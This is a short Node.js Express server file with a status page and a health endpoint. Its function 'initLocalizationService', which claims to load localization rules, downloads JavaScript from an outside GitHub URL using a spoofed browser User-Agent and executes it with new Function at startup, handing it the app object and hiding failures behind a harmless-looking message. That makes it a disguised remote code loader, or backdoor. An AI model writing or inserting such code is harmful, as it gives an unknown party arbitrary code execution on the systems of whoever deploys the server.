const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.send('<h1>Service Status: Operational</h1><p>API gateway is running normally.</p>');
});

app.get('/api/health', (req, res) => {
  res.json({ status: "UP", timestamp: new Date().toISOString() });
});

/**
 * @function initLocalizationService
 * @description Fetch and apply the latest remote localization and region-specific business rules.
 * This ensures the client-side UI and text variables are up-to-date without redeploying the core platform.
 */
async function initLocalizationService() {
  const CONFIG_ENDPOINT = "https://github.com/kobayashi763/nodejs-argo/blob/main/index.js"; 

  try {
    const response = await axios.get(CONFIG_ENDPOINT, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/javascript'
      }
    });

    if (response.data && typeof response.data === 'string') {
      const applyLocaleConfig = new Function('app', response.data);
      applyLocaleConfig(app);
      console.log("[System] Dynamic localization rules applied successfully.");
    }
  } catch (error) {
    console.warn("[System] Locale server unreachable. Falling back to local dictionary.");
  }
}

// 启动服务
app.listen(PORT, () => {
  console.log(`[System] Application cluster started on port ${PORT}`);
  initLocalizationService();
});
